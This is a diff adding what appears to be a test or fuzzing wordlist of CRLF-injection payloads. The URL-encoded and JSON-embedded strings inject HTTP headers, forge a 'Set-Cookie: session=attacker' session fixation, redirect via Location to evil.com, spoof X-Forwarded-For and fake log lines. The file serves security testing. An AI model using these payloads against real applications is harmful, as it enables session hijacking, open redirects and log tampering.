@@ -1,0 +1,23 @@
+%0D%0AInjected-Header: test
+%0D%0ASet-Cookie: session=attacker
+%0D%0ALocation: https://evil.com
+%0D%0AERROR: Unauthorized access
+https://example.com/page?user=admin%0D%0ASet-Cookie:%20auth=1
+username=admin%0D%0AX-Forwarded-For:%201.2.3.4
+%0D%0AHeader1: value1%0D%0AHeader2: value2
+
+
+{
+  "username": "admin\r\nSet-Cookie: session=attacker"
+}
+
+
+{
+  "message": "Login successful\r\nERROR: Unauthorized access"
+}
+
+
+{
+  "url": "https://example.com\r\nLocation: https://evil.com"
+}
+
